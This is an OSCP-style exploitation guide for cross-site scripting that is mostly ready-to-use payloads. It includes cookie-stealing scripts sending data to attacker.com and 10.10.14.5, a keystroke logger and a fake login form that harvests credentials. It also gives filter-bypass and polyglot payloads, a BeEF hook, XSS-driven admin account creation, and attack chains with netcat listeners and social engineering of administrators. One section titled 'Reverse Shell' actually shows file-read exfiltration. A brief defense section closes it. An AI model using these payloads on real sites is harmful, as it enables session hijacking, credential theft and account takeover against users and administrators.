# Cross-Site Scripting (XSS) Exploitation Guide

## Table of Contents
1. [XSS Basics](#xss-basics)
2. [Types of XSS](#types-of-xss)
3. [Detection Techniques](#detection-techniques)
4. [Basic XSS Payloads](#basic-xss-payloads)
5. [Advanced Payloads](#advanced-payloads)
6. [Filter Bypass Techniques](#filter-bypass-techniques)
7. [XSS for OSCP](#xss-for-oscp)
8. [Exploitation Scenarios](#exploitation-scenarios)

---

## XSS Basics

### What is XSS?
Cross-Site Scripting allows attackers to inject malicious JavaScript into web applications, which executes in victims' browsers.

### Impact
- Cookie theft (session hijacking)
- Keylogging
- Credential harvesting
- Defacement
- Phishing
- Malware delivery
- Administrative action execution

---

## Types of XSS

### 1. Reflected XSS (Non-Persistent)
Payload is reflected immediately in response (e.g., search results, error messages)

**Example Vulnerable Code:**
```php
<?php
echo "Search results for: " . $_GET['q'];
?>
```

**Attack:**
```
https://victim.com/search.php?q=<script>alert(1)</script>
```

### 2. Stored XSS (Persistent)
Payload is stored in database and executed when page is viewed

**Example Vulnerable Code:**
```php
<?php
// Store comment in database
$comment = $_POST['comment'];
mysql_query("INSERT INTO comments (text) VALUES ('$comment')");

// Display comments
$result = mysql_query("SELECT text FROM comments");
while($row = mysql_fetch_array($result)) {
    echo $row['text'];  // No sanitization!
}
?>
```

**Attack:**
Submit comment: `<script>alert(document.cookie)</script>`

### 3. DOM-Based XSS
JavaScript processes user input insecurely in the DOM

**Example Vulnerable Code:**
```javascript
// Read from URL fragment
var name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = "Hello " + name;
```

**Attack:**
```
https://victim.com/welcome.html#<img src=x onerror=alert(1)>
```

---

## Detection Techniques

### 1. Manual Testing with Canary Values
```html
<!-- Test basic injection -->
"><script>alert('XSS')</script>

<!-- Test in different contexts -->
<input value="[INJECT_HERE]">
<script>var x='[INJECT_HERE]';</script>
<div>[INJECT_HERE]</div>
```

### 2. Automated Scanning
```bash
# XSStrike
python3 xsstrike.py -u "http://target.com/page?param=test"

# Dalfox
dalfox url http://target.com/page?param=test

# Burp Suite Intruder with XSS payloads
```

### 3. Identifying Injection Points
- URL parameters
- POST body parameters
- HTTP headers (User-Agent, Referer, Cookie)
- File uploads (filename, content)
- JSON/XML inputs
- WebSocket messages

---

## Basic XSS Payloads

### Alert Box (Proof of Concept)
```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(window.origin)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
```

### Image Tag with Error Handler
```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(document.cookie)>
<img src=x onerror=alert(document.domain)>
<img/src/onerror=alert(1)>
<img src onerror=alert(1)>
```

### SVG Payloads
```html
<svg/onload=alert(1)>
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animatetransform onbegin=alert(1)>
<svg><animate onbegin=alert(1)>
```

### Body Tag Events
```html
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<body onhashchange=alert(1)>
```

### Input/Form Events
```html
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus><input>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<form><button formaction=javascript:alert(1)>CLICK
```

### Iframe Payloads
```html
<iframe src="javascript:alert(1)">
<iframe src="data:text/html,<script>alert(1)</script>">
<iframe srcdoc="<script>alert(1)</script>">
<iframe src="http://attacker.com/xss.html">
```

### Link/Anchor Tags
```html
<a href="javascript:alert(1)">Click me</a>
<a href="data:text/html,<script>alert(1)</script>">Click</a>
<a href="#" onclick="alert(1)">Click</a>
```

---

## Advanced Payloads

### Cookie Stealing
```html
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

<script>
new Image().src='http://attacker.com/steal?c=' + document.cookie;
</script>

<script>
location='http://attacker.com/steal?c=' + btoa(document.cookie);
</script>

<img src=x onerror="this.src='http://attacker.com/steal?c='+document.cookie">
```

### Keylogger
```html
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + String.fromCharCode(e.which));
}
</script>

<script>
var keys='';
document.onkeypress = function(e) {
    keys += String.fromCharCode(e.which);
    if(keys.length > 20) {
        new Image().src = 'http://attacker.com/log?k=' + keys;
        keys = '';
    }
}
</script>
```

### Credential Harvesting (Fake Login)
```html
<script>
document.body.innerHTML = `
<h1>Session Expired</h1>
<form action="http://attacker.com/phish" method="POST">
    Username: <input type="text" name="user"><br>
    Password: <input type="password" name="pass"><br>
    <input type="submit" value="Login">
</form>`;
</script>
```

### Page Defacement
```html
<script>
document.body.innerHTML = '<h1>HACKED BY ATTACKER</h1>';
</script>

<script>
document.write('<h1>You have been pwned!</h1>');
</script>
```

### Port Scanning via XSS
```html
<script>
var ports = [80, 443, 8080, 8443];
var target = 'localhost';

ports.forEach(function(port) {
    var img = new Image();
    img.onerror = function() {
        fetch('http://attacker.com/log?port=' + port + '&status=closed');
    }
    img.onload = function() {
        fetch('http://attacker.com/log?port=' + port + '&status=open');
    }
    img.src = 'http://' + target + ':' + port;
});
</script>
```

### BeEF Hook (Browser Exploitation Framework)
```html
<script src="http://attacker.com:3000/hook.js"></script>
```

### Reverse Shell (via XSS to Local File Read - Advanced)
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'file:///etc/passwd', true);
xhr.onload = function() {
    fetch('http://attacker.com/exfil?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

---

## Filter Bypass Techniques

### Bypassing Tag Blacklists

#### Script Tag Blocked
```html
<!-- Use alternative tags -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

#### Case Sensitivity Bypass
```html
<ScRiPt>alert(1)</sCrIpT>
<sCrIpT>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>
```

#### HTML Encoding
```html
<!-- Decimal encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- Hex encoding -->
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">

<!-- Mixed encoding -->
<img src=x onerror="al&#101;rt(1)">
```

#### Unicode Bypass
```html
<script>\u0061lert(1)</script>
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

### Bypassing Keyword Filters

#### "javascript:" Blocked
```html
<a href="java	script:alert(1)">Click</a>  <!-- Tab character -->
<a href="jav&#97;script:alert(1)">Click</a>  <!-- HTML entity -->
<a href="javascript&#58;alert(1)">Click</a>  <!-- Colon encoded -->
<a href="&#106;avascript:alert(1)">Click</a>
<a href="data:text/html,<script>alert(1)</script>">Click</a>
```

#### "alert" Blocked
```html
<script>window['alert'](1)</script>
<script>eval('alert(1)')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>top['al'+'ert'](1)</script>
<script>self['al'+'ert'](1)</script>
<script>confirm(1)</script>  <!-- Alternative function -->
<script>prompt(1)</script>   <!-- Alternative function -->
```

#### "document.cookie" Blocked
```html
<script>alert(window['document']['cookie'])</script>
<script>alert(this['document']['cookie'])</script>
<script>alert(top['document']['cookie'])</script>
```

### Bypassing Parentheses Blocking

#### When () are Blocked
```html
<script>onerror=alert;throw 1</script>
<script>throw onerror=eval,'=alert\x281\x29'</script>
<img src=x onerror="window.onerror=alert;throw 1">
```

### Bypassing Quotes Blocking

#### When ' and " are Blocked
```html
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(/XSS/.source)</script>
<img src=x onerror=alert(1)>  <!-- No quotes needed -->
<iframe src=javascript:alert(1)>  <!-- No quotes needed -->
```

### Bypassing Space Filtering
```html
<!-- Use slash instead of space -->
<img/src=x/onerror=alert(1)>

<!-- Use tab, newline -->
<img	src=x	onerror=alert(1)>

<!-- No space needed -->
<svg><script>alert(1)</script></svg>
```

### Bypassing Angle Brackets
```html
<!-- When < > are blocked/encoded -->
<!-- DOM-based context may not need them -->

<script>
location = 'javascript:alert(1)';
</script>

<!-- If already in script context -->
';alert(1);//
```

### Breaking Out of Attribute Context
```html
<!-- Input: <input value="[USER_INPUT]"> -->

" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
"><script>alert(1)</script><"
" style="position:absolute;top:0;left:0;width:100%;height:100%" onclick="alert(1)

<!-- Input: <img src="[USER_INPUT]"> -->
x" onerror="alert(1)
" onerror="alert(1)" x="
```

### Breaking Out of Script Context
```html
<!-- Input: <script>var x='[USER_INPUT]';</script> -->

'; alert(1); //
'; alert(1); var x='
</script><script>alert(1)</script><script>

<!-- Input: <script>var x="[USER_INPUT]";</script> -->
"; alert(1); //
"; alert(1); var x="
```

### Polyglot XSS Payloads
```html
<!-- Works in multiple contexts -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://i.imgur.com/P8mL8.jpg">

javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

---

## XSS for OSCP

### Common OSCP XSS Scenarios

#### 1. Steal Admin Cookie via Stored XSS
```html
<!-- Inject in comment field, guestbook, etc. -->
<script>
new Image().src='http://10.10.14.5/steal?c='+document.cookie;
</script>

<!-- Listener on attacker machine -->
$ sudo nc -lvnp 80
```

#### 2. Reflected XSS to Get Admin Actions
```html
<!-- Craft malicious link to send to admin -->
http://target.com/admin/delete?id=1&xss=<script>fetch('http://10.10.14.5/pwned')</script>

<!-- When admin clicks, action executes with their privileges -->
```

#### 3. DOM XSS Exploitation
```html
<!-- If page uses location.hash or URL parameters in JS -->
http://target.com/page#<img src=x onerror=alert(document.cookie)>
```

### OSCP-Specific Payloads

#### Simple Cookie Exfiltration
```html
<script>document.location='http://10.10.14.5/?c='+document.cookie</script>

<script>fetch('http://10.10.14.5/?c='+btoa(document.cookie))</script>

<img src=x onerror="location='http://10.10.14.5/?c='+document.cookie">
```

#### Blind XSS Detection (for stored XSS when you can't see output)
```html
<script src="http://10.10.14.5/xss.js"></script>

<img src="http://10.10.14.5/blind.gif">

<script>fetch('http://10.10.14.5/ping?executed=true')</script>
```

#### Force Admin to Execute CSRF Attack
```html
<script>
fetch('http://target.com/admin/adduser', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'username=hacker&password=Password123&role=admin'
});
</script>
```

---

## Exploitation Scenarios

### Scenario 1: Cookie Theft Chain
```
1. Find stored XSS in contact form
2. Inject payload:
   <script>new Image().src='http://10.10.14.5/?c='+document.cookie</script>

3. Start listener:
   sudo nc -lvnp 80

4. Wait for admin to view page
5. Receive admin session cookie
6. Use cookie to access admin panel:
   Cookie: admin_session=abc123xyz...
```

### Scenario 2: Reflected XSS to RCE
```
1. Find reflected XSS in search parameter
2. Craft payload to steal admin cookie
3. Host malicious page on attacker server:

   <!-- http://10.10.14.5/xss.html -->
   <script>
   window.location = 'http://target.com/search?q=<script>fetch("http://10.10.14.5/?c="%2Bdocument.cookie)</script>';
   </script>

4. Social engineer admin to visit http://10.10.14.5/xss.html
5. Capture admin cookie, use to execute commands via admin panel
```

### Scenario 3: Self-XSS to Stored XSS Escalation
```
1. Find XSS that only affects your own session
2. Look for export/share/report functionality
3. Export page containing XSS
4. XSS triggers when admin views exported report
5. Escalates to stored XSS affecting admin
```

---

## Testing Checklist

### Input Validation Testing
- [ ] Test all GET parameters
- [ ] Test all POST parameters
- [ ] Test HTTP headers (User-Agent, Referer, Cookie)
- [ ] Test file upload fields (filename)
- [ ] Test JSON/XML input fields
- [ ] Test URL fragments (#hash)

### Context Testing
- [ ] HTML context: `<div>[INPUT]</div>`
- [ ] Attribute context: `<input value="[INPUT]">`
- [ ] JavaScript context: `<script>var x='[INPUT]'</script>`
- [ ] URL context: `<a href="[INPUT]">`
- [ ] CSS context: `<style>body { background: [INPUT] }</style>`

### Bypass Testing
- [ ] Test with case variations
- [ ] Test with encoding (HTML, Unicode, URL)
- [ ] Test with different tags and events
- [ ] Test polyglot payloads
- [ ] Test null byte injection
- [ ] Test with different browsers

---

## Defense (For Understanding)

### Output Encoding
```php
// PHP
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// JavaScript
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}
```

### Content Security Policy (CSP)
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

### HTTPOnly Cookies
```
Set-Cookie: session=abc123; HttpOnly; Secure
```

---

## Tools

### XSS Scanning Tools
```bash
# XSStrike
git clone https://github.com/s0md3v/XSStrike
cd XSStrike
python3 xsstrike.py -u "http://target.com/page?param=test"

# Dalfox
go install github.com/hahwul/dalfox/v2@latest
dalfox url http://target.com/page?param=test
dalfox file urls.txt

# XSSer
xsser --url "http://target.com/page?param=XSS" --auto

# Burp Suite Pro (Intruder with XSS payload lists)
```

### Payload Lists
```bash
# PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

# SecLists
/usr/share/seclists/Fuzzing/XSS/
```

---

## Quick Reference

### Top 10 Quick Test Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
```

### Cookie Theft One-Liners
```html
<script>fetch('http://10.10.14.5/?c='+document.cookie)</script>
<script>new Image().src='http://10.10.14.5/?c='+document.cookie</script>
<script>location='http://10.10.14.5/?c='+btoa(document.cookie)</script>
<img src=x onerror="this.src='http://10.10.14.5/?c='+document.cookie">
```

---

**Remember**: Always test XSS ethically and with proper authorization. XSS can be powerful for privilege escalation and lateral movement in OSCP!
